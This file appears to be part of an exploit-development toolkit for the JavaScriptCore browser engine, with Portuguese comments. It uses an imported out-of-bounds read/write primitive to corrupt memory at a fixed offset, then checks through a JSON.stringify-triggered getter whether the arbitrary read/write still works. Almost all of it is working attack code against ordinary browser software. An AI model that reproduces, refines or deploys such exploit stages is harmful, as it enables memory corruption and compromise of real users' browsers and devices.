// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForSimpleReadTest";
let getter_called_flag = false;
let current_test_results = {
    success: false, message: "Teste não iniciado.", error: null,
    read_value_in_getter: null
};

const CORRUPTION_OFFSET_TRIGGER = 0x70; // Offset absoluto dentro do oob_array_buffer_real
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

const TEST_READ_OFFSET_IN_GETTER = 0x100; // Offset para ler no getter
const TEST_READ_PATTERN_IN_GETTER = 0x12345678;


class CheckpointForSimpleReadTest {
    constructor(id) {
        this.id_marker = `SimpleReadTestChkpt-${id}`;
        this.some_prop = "trigger_getter_prop"; // Propriedade para o getter
    }

    // Definir o getter diretamente na classe para este teste simplificado
    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "SimpleReadTest_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
        
        current_test_results = { 
            success: false, message: "Getter chamado, tentando leitura simples.",
            error: null, read_value_in_getter: null
        };

        try {
            if (!oob_array_buffer_real || !oob_read_absolute || !oob_write_absolute) { // Adicionado oob_write_absolute
                throw new Error("oob_array_buffer_real ou primitivas R/W não disponíveis no getter.");
            }

            // Escrever um padrão no offset de teste DENTRO do getter
            logS3(`DENTRO DO GETTER: Escrevendo ${toHex(TEST_READ_PATTERN_IN_GETTER)} em oob_data[${toHex(TEST_READ_OFFSET_IN_GETTER)}]...`, "info", FNAME_GETTER);
            oob_write_absolute(TEST_READ_OFFSET_IN_GETTER, TEST_READ_PATTERN_IN_GETTER, 4);

            // Ler de volta do offset de teste
            logS3(`DENTRO DO GETTER: Lendo de oob_data[${toHex(TEST_READ_OFFSET_IN_GETTER)}]...`, "info", FNAME_GETTER);
            const value_read = oob_read_absolute(TEST_READ_OFFSET_IN_GETTER, 4);
            current_test_results.read_value_in_getter = toHex(value_read);

            if (value_read === TEST_READ_PATTERN_IN_GETTER) {
                current_test_results.success = true;
                current_test_results.message = `SUCESSO: Leitura/Escrita no oob_ab dentro do getter funcionou! Lido ${toHex(value_read)}.`;
                logS3(`DENTRO DO GETTER: ${current_test_results.message}`, "good", FNAME_GETTER);
            } else {
                current_test_results.message = `Falha na leitura/escrita no getter. Lido ${toHex(value_read)}, esperado ${toHex(TEST_READ_PATTERN_IN_GETTER)}.`;
                logS3(`DENTRO DO GETTER: ${current_test_results.message}`, "error", FNAME_GETTER);
            }

        } catch (e_getter_main) {
            logS3(`DENTRO DO GETTER: ERRO PRINCIPAL NO GETTER: ${e_getter_main.message}`, "critical", FNAME_GETTER);
            current_test_results.error = String(e_getter_main);
            current_test_results.message = `Erro principal no getter: ${e_getter_main.message}`;
        }
        return { "getter_simple_read_test_done": true };
    }

    // toJSON que aciona o getter
    toJSON() {
        const FNAME_toJSON = "CheckpointForSimpleReadTest.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Tentando acessar getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
        // Acessar a propriedade com getter para acionar a lógica de teste
        // eslint-disable-next-line no-unused-vars
        const DUMMY_ACCESS = this[GETTER_CHECKPOINT_PROPERTY_NAME]; 
        return { id: this.id_marker, processed_by_simple_read_test_toJSON: true };
    }
}

export async function executeRetypeOOB_AB_Test() { 
    const FNAME_TEST_RUNNER = "executeSimpleReadInGetterTestRunner";
    logS3(`--- Iniciando Teste Simplificado de Gatilho de Getter e Leitura ---`, "test", FNAME_TEST_RUNNER);

    getter_called_flag = false;
    current_test_results = { success: false, message: "Teste não executado.", error: null, read_value_in_getter: null };

    if (!JSC_OFFSETS.ArrayBufferContents /* ...etc... Adicione validações de config necessárias */) { 
        current_test_results.message = "Offsets JSC críticos ausentes.";
        logS3(current_test_results.message, "critical", FNAME_TEST_RUNNER);
        return;
    }

    try {
        await triggerOOB_primitive(); // Configura oob_array_buffer_real e oob_dataview_real
        if (!oob_array_buffer_real || !oob_dataview_real || !oob_write_absolute) { 
            current_test_results.message = "OOB Init ou oob_write_absolute falhou/não definido.";
            logS3(current_test_results.message, "critical", FNAME_TEST_RUNNER);
            return; 
        }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST_RUNNER);
        
        // 1. Escrita OOB Gatilho
        logS3(`Realizando escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)}...`, "info", FNAME_TEST_RUNNER);
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} completada.`, "info", FNAME_TEST_RUNNER);

        // 2. Criar o objeto Checkpoint
        const checkpoint_obj = new CheckpointForSimpleReadTest(1);
        logS3(`Checkpoint objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST_RUNNER);
        
        // 3. Chamar JSON.stringify para acionar o getter
        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST_RUNNER);
        let final_json_output = "";
        try {
            final_json_output = JSON.stringify(checkpoint_obj);
            logS3(`JSON.stringify EXTERNO completado. Resultado (parcial): ${final_json_output.substring(0,200)}...`, "info", FNAME_TEST_RUNNER);
        } catch (e_json_ext) { 
            logS3(`Erro em JSON.stringify (externo): ${e_json_ext.message}`, "error", FNAME_TEST_RUNNER);
             if(!getter_called_flag && current_test_results) { 
                current_test_results.error = String(e_json_ext);
                current_test_results.message = (current_test_results.message || "") + `Erro em JSON.stringify (antes do getter): ${e_json_ext.message}`;
            }
        }

    } catch (mainError_runner) { 
        logS3(`Erro principal no runner: ${mainError_runner.message}`, "critical", FNAME_TEST_RUNNER);
        console.error(mainError_runner);
        if(current_test_results) {
            current_test_results.message = (current_test_results.message || "") + `Erro crítico no runner: ${mainError_runner.message}`;
            current_test_results.error = String(mainError_runner);
        }
    }
    finally { 
        logS3("Limpeza do runner finalizada.", "info", "CleanupRunner"); // Log do finally do runner
    }

    // Log dos resultados
    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO TESTE SIMPLES: SUCESSO! ${current_test_results.message}`, "good", FNAME_TEST_RUNNER);
        } else {
            logS3(`RESULTADO TESTE SIMPLES: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST_RUNNER);
        }
        logS3(`  Valor lido no getter de ${toHex(TEST_READ_OFFSET_IN_GETTER)}: ${current_test_results.read_value_in_getter}`, "info", FNAME_TEST_RUNNER);
         if (current_test_results.error) {
            logS3(`  Erro reportado no getter: ${current_test_results.error}`, "error", FNAME_TEST_RUNNER);
         }
    } else {
        logS3("RESULTADO TESTE SIMPLES: Getter NÃO foi chamado.", "error", FNAME_TEST_RUNNER);
         if (current_test_results && current_test_results.error) {
            logS3(`  Erro (provavelmente no runner ou setup): ${current_test_results.error} | Mensagem: ${current_test_results.message}`, "error", FNAME_TEST_RUNNER);
        } else if (current_test_results) {
             logS3(`  Mensagem (sem erro explícito no runner): ${current_test_results.message}`, "info", FNAME_TEST_RUNNER);
        }
    }

    clearOOBEnvironment();
    logS3(`--- Teste Simplificado de Gatilho de Getter e Leitura Concluído ---`, "test", FNAME_TEST_RUNNER);
}
